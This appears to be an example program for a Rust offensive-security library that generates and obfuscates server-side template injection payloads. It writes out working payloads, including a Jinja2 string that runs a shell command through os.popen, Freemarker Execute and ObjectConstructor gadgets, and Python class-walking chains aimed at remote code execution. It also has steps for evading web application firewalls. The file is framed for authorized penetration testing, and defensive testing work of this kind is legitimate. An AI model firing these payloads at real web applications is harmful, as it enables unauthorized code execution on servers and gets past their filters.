//! Server-Side Template Injection (SSTI) Example
//!
//! This example demonstrates SSTI patterns for various template engines
//! including Jinja2, Freemarker, Thymeleaf, and others. Useful for testing
//! template injection vulnerabilities.

use redstr::{ssti_framework_variation, ssti_injection, ssti_syntax_obfuscate};

fn main() {
    println!("=== Server-Side Template Injection (SSTI) Examples ===\n");

    // Example 1: Basic SSTI Injection
    println!("1. Basic SSTI Injection");
    println!("   Purpose: Test basic template injection");
    println!("   Use Case: Detecting SSTI vulnerabilities\n");

    let template = "{{7*7}}";
    println!("   Original template: {}", template);
    let injected = ssti_injection(template);
    println!("   Injected: {}\n", injected);

    // Example 2: Framework-Specific Variations
    println!("2. Framework-Specific SSTI Patterns");
    println!("   Purpose: Test various template engines");
    println!("   Use Case: Multi-framework security testing\n");

    let frameworks = vec!["jinja2", "freemarker", "thymeleaf", "velocity"];
    let base_payload = "{{config}}";

    for framework in frameworks {
        println!("   Testing {} template:", framework);
        let result = ssti_framework_variation(base_payload, framework);
        println!("   {}\n", result);
    }

    // Example 3: Syntax Obfuscation
    println!("3. SSTI Syntax Obfuscation");
    println!("   Purpose: Obfuscate SSTI payloads to bypass WAF");
    println!("   Use Case: WAF bypass and filter evasion\n");

    let payload = "{{request.application.__globals__}}";
    println!("   Original payload: {}", payload);
    let obfuscated = ssti_syntax_obfuscate(payload);
    println!("   Obfuscated: {}\n", obfuscated);

    // Example 4: Jinja2 SSTI Payloads
    println!("4. Jinja2 SSTI Attack Payloads");
    println!("   Purpose: Test Jinja2 template injection");
    println!("   Use Case: Python web application testing\n");

    let jinja_payloads = vec![
        "{{config.items()}}",
        "{{self._TemplateReference__context}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    ];

    for payload in jinja_payloads {
        println!("   Payload: {}", payload);
        let result = ssti_framework_variation(payload, "jinja2");
        println!("   Variation: {}\n", result);
    }

    // Example 5: Freemarker SSTI Payloads
    println!("5. Freemarker SSTI Attack Payloads");
    println!("   Purpose: Test Freemarker template injection");
    println!("   Use Case: Java web application testing\n");

    let freemarker_payloads = vec![
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>",
        "${\"freemarker.template.utility.ObjectConstructor\"?new()}",
    ];

    for payload in freemarker_payloads {
        println!("   Payload: {}", payload);
        let result = ssti_framework_variation(payload, "freemarker");
        println!("   Variation: {}\n", result);
    }

    // Example 6: Red Team Scenario - RCE via SSTI
    println!("6. Red Team Scenario: RCE Attempt via SSTI");
    println!("   Purpose: Test remote code execution through SSTI");
    println!("   Use Case: Comprehensive penetration testing\n");

    let rce_payload = "{{''.__class__.__mro__[1].__subclasses__()}}";
    println!("   Step 1 - Base payload: {}", rce_payload);

    let obf1 = ssti_syntax_obfuscate(rce_payload);
    println!("   Step 2 - Obfuscated: {}", obf1);

    let jinja = ssti_framework_variation(&obf1, "jinja2");
    println!("   Step 3 - Jinja2 variant: {}", jinja);

    let injected = ssti_injection(&jinja);
    println!("   Step 4 - Final payload: {}\n", injected);

    // Example 7: Detection Payloads
    println!("7. SSTI Detection Payloads");
    println!("   Purpose: Detect SSTI vulnerabilities");
    println!("   Use Case: Initial reconnaissance\n");

    let detection_payloads = vec!["{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}", "#{7*7}"];

    for payload in detection_payloads {
        println!("   Detection: {}", payload);
        let result = ssti_injection(payload);
        println!("   Result: {}\n", result);
    }

    // Example 8: Polyglot Payloads
    println!("8. Polyglot SSTI Payloads");
    println!("   Purpose: Test multiple template engines simultaneously");
    println!("   Use Case: Unknown template engine testing\n");

    let polyglot = "{{7*7}}${7*7}<%= 7*7 %>";
    println!("   Polyglot payload: {}", polyglot);

    for framework in ["jinja2", "freemarker", "erb", "velocity"] {
        let result = ssti_framework_variation(polyglot, framework);
        println!("   {} result: {}", framework, result);
    }
    println!();

    // Example 9: Advanced Obfuscation
    println!("9. Advanced SSTI Obfuscation Techniques");
    println!("   Purpose: Bypass advanced WAF and filters");
    println!("   Use Case: Evading modern security controls\n");

    let advanced_payloads = vec![
        "{{request['application']['__globals__']}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__}}",
    ];

    for payload in advanced_payloads {
        println!("   Original: {}", payload);
        let obf = ssti_syntax_obfuscate(payload);
        println!("   Obfuscated: {}\n", obf);
    }

    // Example 10: Blue Team Testing
    println!("10. Blue Team: SSTI Validation Testing");
    println!("    Purpose: Test SSTI detection mechanisms");
    println!("    Use Case: Validating input sanitization\n");

    let test_inputs = vec!["{{user.name}}", "${product.price}", "#{session.user}"];

    for input in test_inputs {
        println!("    Testing input: {}", input);
        println!("    Injection test: {}", ssti_injection(input));
        println!("    Obfuscation test: {}", ssti_syntax_obfuscate(input));
        println!();
    }

    println!("=== Security Testing Tips ===");
    println!("• Test with mathematical expressions (7*7, 7*'7')");
    println!("• Try multiple template syntaxes ({{}}, ${{}}, <%=, #{{}})");
    println!("• Test framework-specific features");
    println!("• Use obfuscation to bypass filters");
    println!("• Check for error messages revealing template engine");
    println!("• Test with polyglot payloads");
    println!("\n⚠️  Use responsibly: Only test systems you own or have permission to test");
}
